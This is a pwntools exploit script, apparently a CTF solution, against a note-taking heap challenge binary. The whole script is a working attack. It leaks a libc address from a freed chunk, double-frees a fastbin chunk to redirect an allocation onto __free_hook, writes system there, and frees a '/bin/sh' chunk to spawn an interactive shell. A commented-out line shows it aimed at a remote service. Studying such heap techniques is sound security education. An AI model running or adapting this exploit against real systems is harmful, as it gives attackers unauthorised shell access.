#!/usr/bin/python3
from pwn import *
import os

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{1102141}', '-P']

context.binary = binary = './notes'
# set context to open terminal in split mode


vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
libc = ELF('./libc.so.6')

gs = '''
continue
'''

def malloc(index, size, note):
    p.sendlineafter('option: ', b'a')
    p.sendlineafter('page: ', index.encode())
    p.sendlineafter('size: ', size.encode())
    p.sendlineafter('note: ', note)

def delete(index):
    p.sendlineafter('option: ', b'd')
    p.sendlineafter('page: ', index.encode())

def read(index):
    p.sendlineafter('option: ', b'b')
    p.sendlineafter('page: ', index.encode())
    return p.recvregex(b'\n.*\n')
    

def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs, aslr=True)
    else:
        if os.path.exists('./libc.so.6'):
            return process([vuln_elf.path], env={"LD_PRELOAD":"./libc.so.6"})
        return process(vuln_elf.path)


p = start()
#p = remote('m1', 7777)

# p.recvuntil(b'system: ')
# system = p.recvuntil(b'\n').decode()
# system = int(system, 16)
# log.info('system: ' + hex(system)) # log the system


for i in range(10):
    malloc(str(i), str(0x300), b'A'*8)

for i in range(7):
    delete(str(i))

delete('7')

main_arena=0x7f881d22fbe0
base=0x7f881d065000

offset = main_arena - base
addr = read('7')
addr = u64(addr[1:-1].ljust(8, b'\0'))
base_addr = addr - offset
log.info(f"{hex(base_addr)=}")

system = (base_addr + 0x30290)
log.info(f"{hex(system)=}")

# allocate 10 chunks
for i in range(10):
    malloc(str(i), '24', b"/bin/sh\x00")

# Free 9 chunks : 0-6 in tcache 7,8 in fastbin
for i in range(9):
    delete(str(i))


# free 7th chunk again
delete('7')


# flush tcache by allocating 
for i in range(7):
    malloc(str(i), '24', b"/bin/sh\x00")


# allocate 7th chunk and make it point to free hook
malloc('7', '24', p64(system + 0x19CBB8)) # __free_hook chunk

# ----
# 7th chunk -> 8th chunk <- 7th chunk
# 8th chunk -> 7th chunk -> free_hook
# ----

# two more chunks to reach free_hook allocation
malloc('8', '24', b"/bin/sh\x00")
malloc('9', '24', b"/bin/sh\x00")



# allocate free_hook and write systems address there
malloc('10', '24', p64(system))

# free a chunk which says /bin/sh which will internally call system
delete('0')



p.interactive()
